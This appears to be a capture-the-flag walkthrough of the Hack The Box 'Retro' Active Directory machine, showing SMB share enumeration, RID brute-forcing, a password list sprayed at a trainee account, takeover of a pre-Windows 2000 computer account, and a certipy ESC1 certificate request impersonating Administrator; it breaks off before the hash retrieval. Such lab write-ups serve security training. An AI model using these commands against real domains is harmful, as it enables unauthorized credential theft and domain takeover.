# RETRO-HTB
Lot's of SMB exploration tips here

Nmap recon:
````
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-05 10:17 -0300
Nmap scan report for retro.htb (10.129.234.44)
Host is up (0.31s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-05 13:17:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-11-05T12:59:51
|_Not valid after:  2027-11-05T12:59:51
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-11-05T12:59:51
|_Not valid after:  2027-11-05T12:59:51
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-11-05T12:59:51
|_Not valid after:  2027-11-05T12:59:51
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-11-05T12:59:51
|_Not valid after:  2027-11-05T12:59:51
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-11-05T13:19:07+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-11-05T13:18:48+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2026-11-04T13:08:59
|_Not valid after:  2027-05-06T13:08:59
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
50022/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50172/tcp open  msrpc         Microsoft Windows RPC
51089/tcp open  msrpc         Microsoft Windows RPC
51107/tcp open  msrpc         Microsoft Windows RPC
51123/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-05T13:18:48
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   166.94 ms 10.10.16.1
2   363.77 ms retro.htb (10.129.234.44)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.81 seconds
````

You can try ffufing but it shows nothing of interest. The bulk of enum'll be done almost totaly via smb.
Check guest shares via nxc:

````
 nxc smb 10.129.234.44 -u guest -p '' --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.44   445    DC               Notes                           
SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ            
````

There are two non default shares: Notes and Trainees. Trainees can be read by guest. Get it with smbclient:
````
smbclient //10.129.234.44/Trainees -U guest ''
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 23 18:58:43 2023
  ..                                DHS        0  Wed Jun 11 11:17:10 2025
  Important.txt                       A      288  Sun Jul 23 19:00:13 2023

                4659711 blocks of size 4096. 1298002 blocks available
smb: \> get Important.txt
getting file \Important.txt of size 288 as Important.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> 
````

The contents of the files are:
````
└─$ cat Important.txt        
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards
````

There seems to be a Trainee user acc that all trainees use and it might have a weak password. Let's enum users bu PID:
````
┌──(spaz㉿kali)-[~/…/HTB/Windows/Retro/nmap]
└─$ netexec smb 10.129.234.44 -u guest -p '' --rid-brute
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 
SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)
````

There actually is a trainee acc and also very interesting a computer acc called BANKING$. We can infer that BANKING$ is a computer acc because of the naming convention "$".
Computer acc generally have better permissions such as: Service Principal Names (SPNs). Kerberos-related authentication capabilities. Permissions over other AD objects. Access to resources granted specifically to that computer. In some configurations, computer accounts can also be exploited through AD certificate services, delegation, or other Kerberos-related weaknesses.
But for now let's focus on trainees as it might have a weaker password.
Let's make a list:
````
 cat passwords     
password
password123!
trainee
trainees
trainee123!
1234
12345
1234567890
qwerty
0000
00000
retro
traineeretro
retro123
````
Now we take this list of really simple passwords and pass it on to the trainee user:
````
└─$ netexec smb 10.129.234.44 -u Trainee -p passwords    
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [-] retro.vl\Trainee:password STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\Trainee:password123! STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [+] retro.vl\Trainee:trainee 
````
We hit trainee:trainee. Now check the shares for trainee:trainee
````
└─$ nxc smb 10.129.234.44 -u trainee -p trainee --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.44   445    DC               Notes           READ            
SMB         10.129.234.44   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ            
````
We can read Notes:
````
└─$ smbclient //10.129.234.44/Notes -U trainee 'trainee'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Apr  9 00:12:49 2025
  ..                                DHS        0  Wed Jun 11 11:17:10 2025
  ToDo.txt                            A      248  Sun Jul 23 19:05:56 2023
  user.txt                            A       32  Wed Apr  9 00:13:01 2025

                4659711 blocks of size 4096. 1297586 blocks available
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> get user.txt
getting file \user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> ^C
````
Inside Notes we find the user.txt and a ToDo list:
````
cat ToDo.txt  
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James                  
````

The key here is "older than me". It's clear that they are talking about the BANKING$ acc, and "older than me" makes me think of pre-windows 2000 computers. There is a great article about that here: https://trustedsec.com/blog/diving-into-pre-created-computer-accounts and here https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers
So, computer accs like BANKING$ in pre windows 2000 systems would have the password default based on the name of the account, but in lowercase. Let's see if that's the case:

<img width="1792" height="65" alt="image" src="https://github.com/user-attachments/assets/b95a53fa-c9a1-43c8-bde0-1d224db2bd1e" />

Here we have a confirmation that the password for BANKING$ is indeed banking:

````
retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
````

The changepasswd script from impacket can change de password of the BANKING$ account:

<img width="1232" height="105" alt="image" src="https://github.com/user-attachments/assets/726e6c83-fb1b-4c78-93e4-e0687f1118f1" />


Now the password for BANKING$ should be 'password'. Let's check it:

<img width="1372" height="67" alt="image" src="https://github.com/user-attachments/assets/d5b9e69f-7f3e-4fb2-851b-a75b9e92e1f4" />

Very nice, let's ask ldap for adcs:
````
└─$ nxc ldap dc.retro.vl -u "banking$" -p 'password' -M adcs
LDAP        10.129.82.134   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.82.134   389    DC               [+] retro.vl\banking$:password 
ADCS        10.129.82.134   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.82.134   389    DC               Found PKI Enrollment Server: DC.retro.vl
ADCS        10.129.82.134   389    DC               Found CN: retro-DC-CA
````

ADCS is installed and a Certificate Authority is present as retro-DC-CA. Let's use certipy to enum further:
````
└─$ certipy-ad find -u 'BANKING$' -p 'password' -dc-ip 10.129.82.134 -vulnerable -stdout
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
````
We found a vulnerability here

````
 [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
````
According to this article: https://www.semperis.com/blog/esc1-attack-explained/
"In an ESC1 attack, an attacker exploits a misconfigured Enterprise CA certificate template in AD CS to request a certificate for a high-privileged account—for example, Domain Admin. Then, they use that certificate to act as that account, gaining unauthorized control."

We can use certipy to exploit it, might take one or two tries:
````
└─$ certipy-ad req -u 'BANKING$' -p 'password' -dc-ip 10.129.82.134 -ca retro-DC-CA -template RetroClients -upn Administrator -debug -target dc.retro.vl -key-size 4096 -sid S-1-5-21-2983547755-698260136-4283918172-500
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.82.134'
[+] DC IP: '10.129.82.134'
[+] DC Host: None
[+] Target IP: None
[+] Remote Name: 'dc.retro.vl'
[+] Domain: ''
[+] Username: 'BANKING$'
[+] Trying to resolve 'dc.retro.vl' at '10.129.82.134'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.82.134[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.82.134[\pipe\cert]
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[+] Found SID in SAN URL: 'S-1-5-21-2983547755-698260136-4283918172-500'
[+] Found SID in security extension: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
````

Now we use the certificate and private key saved at administrator.pfx to retrieve the RC4 hash of the Administrator user:






